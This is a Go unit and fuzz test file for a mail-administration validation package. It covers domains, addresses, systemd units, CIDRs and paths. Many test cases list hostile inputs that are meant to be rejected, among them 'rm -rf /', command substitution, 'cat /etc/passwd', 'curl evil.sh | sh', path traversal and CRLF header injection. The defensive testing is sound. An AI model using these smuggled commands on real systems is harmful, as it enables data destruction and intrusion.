package valid

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Domain
// ---------------------------------------------------------------------------

func TestDomain(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"simple", "example.com", "example.com", false},
		{"uppercase lowered", "EXAMPLE.com", "example.com", false},
		{"mixed case", "ExAmPlE.CoM", "example.com", false},
		{"trailing dot stripped", "example.com.", "example.com", false},
		{"leading/trailing space trimmed", "  example.com  ", "example.com", false},
		{"subdomain", "mail.example.com", "mail.example.com", false},
		{"deep subdomain", "a.b.c.d.example.com", "a.b.c.d.example.com", false},
		{"hyphenated label", "my-domain.example.com", "my-domain.example.com", false},
		{"numeric label", "123.example.com", "123.example.com", false},
		{"single-char labels", "a.b.co", "a.b.co", false},
		{"max-length label (63)", strings.Repeat("a", 63) + ".com", strings.Repeat("a", 63) + ".com", false},

		{"empty", "", "", true},
		{"whitespace only", "   ", "", true},
		{"no tld / bare label", "localhost", "", true},
		{"leading dot", ".example.com", "", true},
		{"double dot", "example..com", "", true},
		{"leading hyphen label", "-example.com", "", true},
		{"trailing hyphen label", "example-.com", "", true},
		{"label too long (64)", strings.Repeat("a", 64) + ".com", "", true},
		{"underscore", "ex_ample.com", "", true},
		{"space inside", "exa mple.com", "", true},
		{"trailing space kept internal invalid", "example .com", "", true},

		// Injection-shaped / malicious input.
		{"shell metachar semicolon", "example.com;rm -rf /", "", true},
		{"shell metachar backtick", "example.com`whoami`", "", true},
		{"shell metachar dollar-paren", "example.com$(whoami)", "", true},
		{"shell pipe", "example.com|cat /etc/passwd", "", true},
		{"path traversal", "../../etc/passwd", "", true},
		{"path traversal domain-shaped", "..example.com", "", true},
		{"null byte", "example.com\x00", "", true},
		{"null byte mid-string", "exa\x00mple.com", "", true},
		{"newline injection", "example.com\nMAIL FROM:<a@b>", "", true},
		{"crlf injection", "example.com\r\nHELO evil", "", true},
		{"sql metachars", "example.com' OR '1'='1", "", true},
		{"sql comment", "example.com--", "", true},
		{"unicode homograph cyrillic a", "аpple.com", "", true}, // Cyrillic 'а' not in [a-z0-9]
		{"idna-looking but raw unicode rejected", "example.édu", "", true},
		// NOTE: reDomain caps each label at 63 chars but does not cap the total
		// length (real DNS names top out at 253 octets). A long chain of
		// single-char labels is accepted today — documented here rather than
		// silently assumed away; see report for a suggested follow-up.
		{"long chain of short labels currently accepted", strings.Repeat("a.", 2000) + "com", strings.Repeat("a.", 2000) + "com", false},
		{"wildcard glob", "*.example.com", "", true},
		{"protocol-relative", "//example.com", "", true},
		{"at-sign smuggling", "example.com@evil.com", "", true},
		{"space then command", "example.com && curl evil.sh | sh", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Domain(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Domain(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Domain(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Domain(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("Domain(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Address
// ---------------------------------------------------------------------------

func TestAddress(t *testing.T) {
	cases := []struct {
		name       string
		in         string
		local, dom string
		wantErr    bool
	}{
		{"simple", "user@example.com", "user", "example.com", false},
		{"uppercase lowered", "User@Example.COM", "user", "example.com", false},
		{"dotted local", "first.last@example.com", "first.last", "example.com", false},
		{"plus tag", "user+tag@example.com", "user+tag", "example.com", false},
		{"local with hyphen", "user-name@example.com", "user-name", "example.com", false},
		{"local with underscore, dot, plus", "a.b_c+d@example.com", "a.b_c+d", "example.com", false},
		{"whitespace trimmed", "  user@example.com  ", "user", "example.com", false},

		{"empty", "", "", "", true},
		{"no at sign", "userexample.com", "", "", true},
		{"two at signs", "user@evil@example.com", "", "", true},
		{"empty local", "@example.com", "", "", true},
		{"empty domain", "user@", "", "", true},
		{"invalid domain part", "user@..com", "", "", true},
		{"local starts with dot", ".user@example.com", "", "", true},
		{"local starts with plus", "+user@example.com", "", "", true},
		{"local too long (65)", strings.Repeat("a", 65) + "@example.com", "", "", true},

		// Injection-shaped.
		{"shell metachar", "user@example.com;id", "", "", true},
		{"header injection cc", "user@example.com\nCc: victim@evil.com", "", "", true},
		{"null byte", "user@example.com\x00", "", "", true},
		{"path traversal local", "../../etc/passwd@example.com", "", "", true},
		{"sql injection shaped", "user'--@example.com", "", "", true},
		{"space in address", "us er@example.com", "", "", true},
		{"double at smuggle", "user@evil.com@example.com", "", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			local, dom, err := Address(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Address(%q) = (%q, %q), nil; want error", c.in, local, dom)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Address(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Address(%q) unexpected error: %v", c.in, err)
			}
			if local != c.local || dom != c.dom {
				t.Fatalf("Address(%q) = (%q, %q); want (%q, %q)", c.in, local, dom, c.local, c.dom)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// AliasSource
// ---------------------------------------------------------------------------

func TestAliasSource(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"full address", "user@example.com", "user@example.com", false},
		{"catch-all", "@example.com", "@example.com", false},
		{"catch-all uppercase", "@EXAMPLE.COM", "@example.com", false},
		{"catch-all trimmed", "  @example.com  ", "@example.com", false},

		{"empty", "", "", true},
		{"bare at sign", "@", "", true},
		{"catch-all invalid domain", "@..com", "", true},
		{"invalid address", "not-an-address", "", true},
		{"double catch-all", "@@example.com", "", true},

		// Injection-shaped.
		{"catch-all shell injection", "@example.com;rm -rf /", "", true},
		{"catch-all traversal", "@../../etc", "", true},
		{"catch-all null byte", "@example.com\x00", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := AliasSource(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("AliasSource(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("AliasSource(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("AliasSource(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("AliasSource(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// QueueID
// ---------------------------------------------------------------------------

func TestQueueID(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"lowercase upcased", "a1b2c3", "A1B2C3", false},
		{"already upper", "ABCDEF", "ABCDEF", false},
		{"min length 6", "123456", "123456", false},
		{"max length 16", "0123456789ABCDEF", "0123456789ABCDEF", false},
		{"trimmed", "  ABCDEF  ", "ABCDEF", false},

		{"empty", "", "", true},
		{"too short (5)", "12345", "", true},
		{"too long (17)", "0123456789ABCDEF0", "", true},
		{"non-hex char", "GHIJKL", "", true},
		{"contains space", "ABC DEF", "", true},

		// Injection-shaped.
		{"shell metachar", "ABCDEF;rm -rf /", "", true},
		{"path traversal", "../../etc/passwd", "", true},
		{"null byte", "ABCDEF\x00", "", true},
		{"backtick", "`id`ABCD", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := QueueID(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("QueueID(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("QueueID(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("QueueID(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("QueueID(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Selector
// ---------------------------------------------------------------------------

func TestSelector(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"simple", "default", "default", false},
		{"uppercase lowered", "DEFAULT", "default", false},
		{"with digits", "sel2024", "sel2024", false},
		{"with dot", "mail.key1", "mail.key1", false},
		{"with underscore", "mail_key1", "mail_key1", false},
		{"with hyphen", "mail-key1", "mail-key1", false},
		{"trimmed", "  default  ", "default", false},
		{"max length (63)", strings_repeat_alnum(63), strings_repeat_alnum(63), false},

		{"empty", "", "", true},
		{"too long (64)", strings_repeat_alnum(64), "", true},
		{"starts with hyphen", "-sel", "", true},
		{"starts with dot", ".sel", "", true},

		// Injection-shaped.
		{"shell metachar", "sel;id", "", true},
		{"path traversal", "../../etc/passwd", "", true},
		{"null byte", "sel\x00", "", true},
		{"space", "sel ector", "", true},
		{"slash", "sel/ector", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Selector(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Selector(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Selector(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Selector(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("Selector(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// strings_repeat_alnum returns a string of n lowercase alnum chars starting
// with a letter, valid input shape for Selector/Unit length-boundary tests.
func strings_repeat_alnum(n int) string {
	if n <= 0 {
		return ""
	}
	b := make([]byte, n)
	b[0] = 'a'
	for i := 1; i < n; i++ {
		b[i] = byte('a' + (i % 26))
	}
	return string(b)
}

// ---------------------------------------------------------------------------
// Unit
// ---------------------------------------------------------------------------

func TestUnit(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"simple service", "postfix.service", "postfix.service", false},
		{"templated unit", "mailadmin@1.service", "mailadmin@1.service", false},
		{"with hyphen", "fail2ban-server.service", "fail2ban-server.service", false},
		{"with underscore", "my_unit.service", "my_unit.service", false},
		{"mixed case preserved", "Postfix.Service", "Postfix.Service", false},
		{"max length (128)", strings.Repeat("a", 128), strings.Repeat("a", 128), false},
		{"trimmed", "  postfix.service  ", "postfix.service", false},

		{"empty", "", "", true},
		{"too long (129)", strings.Repeat("a", 129), "", true},
		{"space inside", "post fix.service", "", true},
		{"slash", "post/fix.service", "", true},

		// Injection-shaped — Unit only enforces charset; allowlisting is the
		// caller's job per the doc comment, but these must still fail the regex.
		{"shell metachar semicolon", "postfix.service;rm -rf /", "", true},
		{"shell pipe", "postfix.service|id", "", true},
		{"path traversal", "../../etc/systemd/system/evil.service", "", true},
		{"null byte", "postfix.service\x00", "", true},
		{"backtick", "postfix`id`.service", "", true},
		{"dollar paren", "postfix$(id).service", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Unit(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Unit(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Unit(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Unit(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("Unit(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// CIDR
// ---------------------------------------------------------------------------

func TestCIDR(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"ipv4", "203.0.113.5", "203.0.113.5", false},
		{"ipv4 cidr", "203.0.113.0/24", "203.0.113.0/24", false},
		{"ipv4 host cidr", "203.0.113.5/32", "203.0.113.5/32", false},
		{"ipv6", "2001:db8::1", "2001:db8::1", false},
		{"ipv6 cidr", "2001:db8::/32", "2001:db8::/32", false},
		{"trimmed", "  203.0.113.5  ", "203.0.113.5", false},
		{"unspecified ipv4", "0.0.0.0", "0.0.0.0", false},
		{"loopback", "127.0.0.1", "127.0.0.1", false},

		{"empty", "", "", true},
		{"not an ip", "not-an-ip", "", true},
		{"out-of-range octet", "999.999.999.999", "", true},
		{"missing prefix len", "203.0.113.0/", "", true},
		{"bad prefix len", "203.0.113.0/33", "", true},
		{"hostname", "example.com", "", true},

		// Injection-shaped.
		{"shell metachar", "203.0.113.5;id", "", true},
		{"path traversal", "../../etc/passwd", "", true},
		{"null byte", "203.0.113.5\x00", "", true},
		{"sql injection shaped", "203.0.113.5' OR '1'='1", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := CIDR(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("CIDR(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("CIDR(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("CIDR(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("CIDR(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Port
// ---------------------------------------------------------------------------

func TestPort(t *testing.T) {
	cases := []struct {
		name    string
		in      int
		wantErr bool
	}{
		{"min valid", 1, false},
		{"common smtp", 25, false},
		{"common submission", 587, false},
		{"max valid", 65535, false},
		{"mid", 8080, false},

		{"zero", 0, true},
		{"negative", -1, true},
		{"negative large", -65535, true},
		{"too large", 65536, true},
		{"way too large", 1 << 20, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Port(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Port(%d) = %d, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Port(%d) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Port(%d) unexpected error: %v", c.in, err)
			}
			if got != c.in {
				t.Fatalf("Port(%d) = %d; want %d", c.in, got, c.in)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Proto
// ---------------------------------------------------------------------------

func TestProto(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"tcp", "tcp", "tcp", false},
		{"udp", "udp", "udp", false},
		{"uppercase tcp lowered", "TCP", "tcp", false},
		{"uppercase udp lowered", "UDP", "udp", false},
		{"trimmed", "  tcp  ", "tcp", false},

		{"empty", "", "", true},
		{"sctp not allowed", "sctp", "", true},
		{"icmp not allowed", "icmp", "", true},
		{"raw not allowed", "raw", "", true},
		{"garbage", "tcp,udp", "", true},

		// Injection-shaped.
		{"shell metachar", "tcp;id", "", true},
		{"null byte", "tcp\x00", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Proto(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Proto(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Proto(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Proto(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("Proto(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Duration
// ---------------------------------------------------------------------------

func TestDuration(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{"seconds", "30s", "30s", false},
		{"minutes", "30m", "30m", false},
		{"hours", "4h", "4h", false},
		{"days", "7d", "7d", false},
		{"single digit", "1h", "1h", false},
		{"max digits (8)", "12345678h", "12345678h", false},
		{"trimmed", "  4h  ", "4h", false},

		{"empty", "", "", true},
		{"no unit", "30", "", true},
		{"bad unit", "30x", "", true},
		{"too many digits (9)", "123456789h", "", true},
		{"negative", "-4h", "", true},
		{"decimal", "4.5h", "", true},
		{"multiple units go-style", "1h30m", "", true},

		// Injection-shaped.
		{"shell metachar", "4h;id", "", true},
		{"null byte", "4h\x00", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := Duration(c.in)
			if c.wantErr {
				if err == nil {
					t.Fatalf("Duration(%q) = %q, nil; want error", c.in, got)
				}
				if !errors.Is(err, ErrInvalid) {
					t.Fatalf("Duration(%q) error = %v; want wrapping ErrInvalid", c.in, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Duration(%q) unexpected error: %v", c.in, err)
			}
			if got != c.want {
				t.Fatalf("Duration(%q) = %q; want %q", c.in, got, c.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Fuzz targets — riskiest parsers: Domain and Address. These run as ordinary
// seed-corpus tests under `go test ./...`; full fuzzing needs `go test -fuzz`.
// The only invariant checked is "never panics" (crash-safety), since the
// validators are intentionally permissive about *rejecting* almost anything —
// correctness of acceptance is covered exhaustively by the table tests above.
// ---------------------------------------------------------------------------

func FuzzDomain(f *testing.F) {
	seeds := []string{
		"example.com",
		"EXAMPLE.COM.",
		"",
		"a.b.c.example.co.uk",
		"-bad-.com",
		"../../etc/passwd",
		"example.com\x00",
		"xn--nxasmq6b.com", // punycode
		strings.Repeat("a", 300) + ".com",
		"exa mple.com;rm -rf /",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got, err := Domain(s)
		if err == nil {
			// A successful parse must round-trip through the same validator
			// and must never contain characters that could break out of a
			// shell argv or SQL literal context.
			if _, err2 := Domain(got); err2 != nil {
				t.Fatalf("Domain(%q) = %q but Domain(%q) errored: %v", s, got, got, err2)
			}
			if strings.ContainsAny(got, ";|&$`\n\r\x00'\"\\") {
				t.Fatalf("Domain(%q) accepted dangerous output %q", s, got)
			}
		}
	})
}

func FuzzAddress(f *testing.F) {
	seeds := []string{
		"user@example.com",
		"",
		"@example.com",
		"user@",
		"user@example.com\nCc: x@y",
		"user+tag@example.com",
		strings.Repeat("a", 70) + "@example.com",
		"user@example.com;id",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		local, dom, err := Address(s)
		if err == nil {
			if strings.ContainsAny(local, ";|&$`\n\r\x00'\"\\@") {
				t.Fatalf("Address(%q) accepted dangerous local-part %q", s, local)
			}
			if strings.ContainsAny(dom, ";|&$`\n\r\x00'\"\\") {
				t.Fatalf("Address(%q) accepted dangerous domain %q", s, dom)
			}
			if _, _, err2 := Address(local + "@" + dom); err2 != nil {
				t.Fatalf("Address(%q) = (%q,%q) but round-trip errored: %v", s, local, dom, err2)
			}
		}
	})
}

func FuzzCIDR(f *testing.F) {
	seeds := []string{
		"203.0.113.5",
		"203.0.113.0/24",
		"2001:db8::1",
		"",
		"not-an-ip",
		"999.999.999.999",
		"203.0.113.5;id",
		"../../etc/passwd",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got, err := CIDR(s)
		if err == nil {
			if strings.ContainsAny(got, ";|&$`\n\r\x00'\"\\") {
				t.Fatalf("CIDR(%q) accepted dangerous output %q", s, got)
			}
		}
	})
}

// ---------------------------------------------------------------------------
// PathUnder
// ---------------------------------------------------------------------------

func TestPathUnder(t *testing.T) {
	root := t.TempDir()

	// A real file directly under root.
	inFile := filepath.Join(root, "example.com", "user")
	if err := os.MkdirAll(inFile, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	msgPath := filepath.Join(inFile, "message")
	if err := os.WriteFile(msgPath, []byte("hi"), 0o644); err != nil {
		t.Fatalf("setup: %v", err)
	}

	// A file outside root, used as a traversal/symlink target.
	outsideDir := t.TempDir()
	outsideFile := filepath.Join(outsideDir, "secret")
	if err := os.WriteFile(outsideFile, []byte("secret"), 0o644); err != nil {
		t.Fatalf("setup: %v", err)
	}

	t.Run("absolute path under root resolves", func(t *testing.T) {
		got, err := PathUnder(root, msgPath)
		if err != nil {
			t.Fatalf("PathUnder: %v", err)
		}
		want, _ := filepath.EvalSymlinks(msgPath)
		if got != want {
			t.Errorf("got %q, want %q", got, want)
		}
	})

	t.Run("relative path resolves under root", func(t *testing.T) {
		got, err := PathUnder(root, filepath.Join("example.com", "user", "message"))
		if err != nil {
			t.Fatalf("PathUnder: %v", err)
		}
		want, _ := filepath.EvalSymlinks(msgPath)
		if got != want {
			t.Errorf("got %q, want %q", got, want)
		}
	})

	t.Run("dot-dot traversal rejected", func(t *testing.T) {
		traversal := filepath.Join(root, "example.com", "user", "..", "..", "..", filepath.Base(outsideDir), "secret")
		if _, err := PathUnder(root, traversal); err == nil {
			t.Fatalf("expected error for traversal path")
		}
	})

	t.Run("absolute path outside root rejected", func(t *testing.T) {
		if _, err := PathUnder(root, outsideFile); err == nil {
			t.Fatalf("expected error for path outside root")
		}
	})

	t.Run("nonexistent path rejected", func(t *testing.T) {
		if _, err := PathUnder(root, filepath.Join(root, "nope", "nothing")); err == nil {
			t.Fatalf("expected error for nonexistent path")
		}
	})

	t.Run("empty path rejected", func(t *testing.T) {
		if _, err := PathUnder(root, ""); err == nil {
			t.Fatalf("expected error for empty path")
		}
	})

	t.Run("symlink escape rejected", func(t *testing.T) {
		link := filepath.Join(root, "escape")
		if err := os.Symlink(outsideFile, link); err != nil {
			t.Skipf("symlink not supported in this environment: %v", err)
		}
		if _, err := PathUnder(root, link); err == nil {
			t.Fatalf("expected error for symlink escaping root")
		}
	})

	t.Run("root itself resolves", func(t *testing.T) {
		if _, err := PathUnder(root, root); err != nil {
			t.Fatalf("PathUnder(root): %v", err)
		}
	})
}
